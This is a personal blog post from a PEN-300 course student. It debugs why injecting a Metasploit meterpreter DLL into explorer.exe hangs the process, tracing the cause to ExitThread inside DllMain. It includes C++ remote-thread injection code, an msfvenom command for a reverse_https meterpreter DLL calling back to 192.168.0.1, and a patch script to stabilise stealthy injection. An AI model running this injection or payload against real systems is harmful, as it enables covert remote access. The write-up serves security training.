[{"content":"Quite recently, I started working on the PEN-300: Advanced Evasion Techniques and Breaching Defenses course from OffSec. One of the process injection techniques discussed in the Process Injection and Migration chapter is making the remote process load a DLL via LoadLibrary and CreateRemoteThread. In the course, we are requested to inject a DLL generated by msfvenom from the metasploit framework into the explorer.exe process. When running this I noticed that explorer.exe became unstable when the DLL was injected. This blog post goes into the understanding, research and solution I used to solve this issue.\nMotivation As described above, one of the classic techniques taught for process injection, involves using a couple of Win32 APIs to make the remote process load a library whose path is injected into the process. This is done by making the remote process start a thread, executing LoadLibrary with the path of the DLL as a parameter which ends up loading the DLL into the target process. Injecting a DLL generated by msfvenom into explorer.exe is ideal for keeping stealthy (even though writing the DLL to disk is questionable). The code to do so is in the Injector project which can be found on a GitHub repository I created as a PoC for this blog post, however the most important part can be found in the code extract below. The code used in the course is written in C#, however for the purposes of this blog post, I wrote everything in C++.\nvoid Inject(int pid, const char* path) { HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid); LPVOID addr = VirtualAllocEx(hProc, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); size_t nWritten = 0; WriteProcessMemory(hProc, addr, path, strlen(path), \u0026amp;nWritten); LPTHREAD_START_ROUTINE procAddr = (LPTHREAD_START_ROUTINE)\u0026amp;LoadLibraryA; CreateRemoteThread(hProc, NULL, 0, procAddr, addr, 0, NULL); } Usually after running LoadLibrary, one would need to run GetProcAddress to locate the address of the function that needs to be executed, and then execute the function with the required parameters. Luckily DLLs have an optional entry point function which is called on LoadLibrary, FreeLibrary and on attach or detach by the first thread of a process. This function is DllMain, the details of which can be found here.\nBOOL WINAPI DllMain( _In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved ); The reason for calling this method by the different function is specified in the fdwReason parameter, with DLL_PROCESS_ATTACH being the reason used by LoadLibrary. DLLs like the ones generated by msfvenom execute their payload on DLL load as can be seen in the template used by metasploit to generate DLLs.\nBOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: ExecutePayload(); break; case DLL_PROCESS_DETACH: // Code to run when the DLL is freed break; case DLL_THREAD_ATTACH: // Code to run when a thread is created during the DLL\u0026#39;s lifetime break; case DLL_THREAD_DETACH: // Code to run when a thread ends normally. break; } return TRUE; } Using this code to inject a meterpreter DLL into explorer.exe, it was noticed that while the exploit does work, explorer.exe becomes unstable and unresponsive, until it hangs, gets killed and respawned. Although other techniques exist which can be used, it was strange that this was happening.\nResearch MSDN Looking at the Dynamic-Link Library Best Practices documentation, we notice that Microsoft says that there are certain tasks which should not be performed within DllMain. I\u0026rsquo;ve highlighted ones that are particularly interesting to me.\nYou should never perform the following tasks from within DllMain:\nCall LoadLibrary or LoadLibraryEx (either directly or indirectly). This can cause a deadlock or a crash. \u0026hellip; Synchronize with other threads. This can cause a deadlock. Acquire a synchronization object that is owned by code that is waiting to acquire the loader lock. This can cause a deadlock. \u0026hellip; Call CreateProcess. Creating a process can load another DLL. Call ExitThread. Exiting a thread during DLL detach can cause the loader lock to be acquired again, causing a deadlock or a crash. Call CreateThread. Creating a thread can work if you do not synchronize with other threads, but it is risky. \u0026hellip; From the documentation of CreateRemoteThread, we also see the following remark\nThe ExitProcess, ExitThread, CreateThread, CreateRemoteThread functions, and a process that is starting (as the result of a CreateProcess call) are serialized between each other within a process. Only one of these events occurs in an address space at a time. This means the following restrictions hold:\nDuring process startup and DLL initialization routines, new threads can be created, but they do not begin execution until DLL initialization is done for the process. Only one thread in a process can be in a DLL initialization or detach routine at a time. ExitProcess returns after all threads have completed their DLL initialization or detach routines. From these two articles, we can clearly see that:\nthere is some sort of lock between ExitProcess, ExitThread, CreateThread and CreateRemoteThread which allows only one event to occur at a time within a process using certain functionality from DllMain could cause issues such as deadlocks Metasploit As we\u0026rsquo;ve seen previously in the DLL template, DLLs generated by metasploit have the DllMain function which calls an ExecutePayload function on DLL_PROCESS_ATTACH. Looking at what the code in ExecutePayload, we see that DLL itself launches a rundll32.exe suspended process, injects shellcode into it and hijacks thread execution in the new process to execute the injected shellcode using GetThreadContext and SetThreadContext. Finally it calls ResumeThread to actually execute the shellcode.\nFrom the research done and going through the ExecutePayload function, we can highlight the following.\nvoid ExecutePayload(void) { // ... if (Synchronize()) { // Create a suspended process, write shellcode into stack, make stack RWX, // resume it DWORD result = CreateProcess(NULL, \u0026#34;rundll32.exe\u0026#34;, NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS|CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, \u0026amp;si, \u0026amp;pi); // If we fail, try again without the CREATE_BREAKAWAY_FROM_JOB flag in the // event that we are in a job but we can\u0026#39;t break away from it. if (result == FALSE){ result = CreateProcess(NULL, \u0026#34;rundll32.exe\u0026#34;, NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, NULL, NULL, \u0026amp;si, \u0026amp;pi); } //... } //... ExitThread(0); } The functions CreateProcess and ExitThread have been highlighted as they could possibly be problematic. The DLL Best Practices documentation tells us that CreateProcess could cause another DLL load. Since no additional information is provided, we will assume that this means that the launched process would also try to load a DLL in our process, via whatever method possible. ExitThread is mentioned in both articles as being possibly problematic. To verify this, we\u0026rsquo;ll create a simplified PoC, where we\u0026rsquo;ll create a thread to load an arbitrary DLL. We\u0026rsquo;ll also create two identical DLLs, one of which returns from the DllMain via return TRUE, while the other one uses ExitThread. We\u0026rsquo;ll see how the application reacts to loading both DLLs, and try to verify that the one with ExitThread causes issues.\nPoC All the code for this PoC can be found here with the title of each section having the same name as each project in the PoC.\nInjectee This is the application that will be used to load the DLLs. The application runs in a loop and accepts keyboard input. It accepts two commands\nUsage: load \u0026lt;dllname\u0026gt; Loads a dll into the process exit Exit the process When calling load \u0026lt;dllname\u0026gt;, a thread is created which loads the specified DLL as follows\nDWORD WINAPI myThread(LPVOID lpParameter) { char* libPath = (char*)lpParameter; cout \u0026lt;\u0026lt; \u0026#34;[Thread] - Trying to load library\u0026#34; \u0026lt;\u0026lt; endl; HMODULE hLib = LoadLibraryA(libPath); FreeLibrary(hLib); delete[] libPath; return 0; } We also call FreeLibrary to be able to load a library multiple times.\nSampleGood SampleGood is a DLL, which does not use any functions which could be problematic. The code for DLL_PROCESS_ATTACH just prints two statements, and looks as follows\nvoid DoStuff(void) { printf(\u0026#34;Hello world from a good DLL :)\\n\\n\u0026#34;); printf(\u0026#34;Returning normally\\n\u0026#34;); } As we see from the code of DllMain, the function returns TRUE once DoStuff is done.\nBOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: DoStuff(); break; case DLL_THREAD_ATTACH: printf(\u0026#34;[SampleGood.dll] - DLL_THREAD_ATTACH\\n\u0026#34;); break; case DLL_THREAD_DETACH: printf(\u0026#34;[SampleGood.dll] - DLL_THREAD_DETACH\\n\u0026#34;); break; case DLL_PROCESS_DETACH: printf(\u0026#34;[SampleGood.dll] - DLL_PROCESS_DETACH\\n\u0026#34;); break; } return TRUE; } SampleBad SampleBad does pretty much the same what SampleGood does. However, the DoStuff function emulates what the DLL generated by msfvenom does and calls ExitThread(0).\nvoid DoStuff(void) { printf(\u0026#34;Hello world from a bad DLL \u0026#39;(?_?)\u0026#39;\\n\\n\u0026#34;); printf(\u0026#34;Calling ExitThread\\n\u0026#34;); ExitThread(0); } Running the PoC Let\u0026rsquo;s run the Injectee application and make it load the SampleGood library to get a base line. Since we\u0026rsquo;re not using any problematic functions, we can see that the library load and unload work correctly and since we\u0026rsquo;re unloading the library after each load, we can load it multiple times.\nAs we see from the image above, we can load and unload multiple times, and when we exit the process, everything works correctly. It\u0026rsquo;s important to note that on each load, the main thread outputs \u0026ldquo;Trying to load [library name]\u0026rdquo;, while the thread created to load and unload the library outputs \u0026quot;[Thread] - Trying to load library\u0026quot;.\nLet\u0026rsquo;s now run the Injectee application and load the SampleBad library.\nThere are multiple things that we notice now:\nWe don\u0026rsquo;t see the message that the DLL has been detached When we try to re-load the library, not only is the DLL not re-loaded, we don\u0026rsquo;t even see the message from the thread that we\u0026rsquo;re trying to load a library The process hangs when we try to exit the process Using the Injector project in our PoC code, we can also confirm that this happens with CreateRemoteThread. When we inject the SampleGood first and then the SampleBad, both DLLs are loaded, meaning that CreateRemoteThread ran in both cases (regardless of the fact that after loading SampleBad we\u0026rsquo;re not able to run it anymore).\nOn the contrary, loading SampleBad first, we see that CreateRemoteThread does not work when we request to load SampleGood.\nResults From the previous section, we can build a hypothesis about what is happening:\nSince we never see the DLL_PROCESS_DETACH message when ExitThread is called, we can safely assume that LoadLibrary never returned. LoadLibrary should return when a DllMain returns with any value. With the DLL loading/unloading thread stuck in LoadLibrary, we can also assume that the thread is also still running. Both CreateThread (to load new DLLs) and ExitProcess (via the return from the main function) are not executing. From our research, we know that ExitThread, ExitProcess, CreateThread and CreateRemoteThread calls are serialized, meaning only one of them can run within all threads of a process. This suggests some sort of lock that ExitThread is keeping. Research and results show that ExitThread is indeed the issue. It also suggests that a lock is holding new threads from executing. Going back to our original question explorer.exe typically creates and destructs threads as needed, so locking the thread creation and deletion process would cause it to malfunction and eventually crash.\nFix After all this, we concluded that removing ExitThread, we would be able to correctly inject the DLL generated by msfvenom. For this reason, I created a python3 script which can be run on both a 64-bit and 32-bit DLL. The script looks for the bytes in the DLL that perform the ExitThread call and NOPs it out. This script can be found here and can be run using the following command\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 \\ -f dll -o met.dll python3 remove_exitthread_msf.py met.dll References PEN-300 Course from OffSec metasploit framework PoC code for this blog post DllMain documention on MSDN DLL template used by metasploit Dynamic-Link Library Best Practices CreateRemoteThread function Gist to remove the ExitThread ","date":"2023-03-26T22:03:06+02:00","image":"https://reubensammut.github.io/posts/dllmain-and-threads/inject_hu12a25e6ba988a97bbade249755b091a9_55811_120x120_fill_box_smart1_3.png","permalink":"https://reubensammut.github.io/posts/dllmain-and-threads/","title":"DllMain and Threads"}]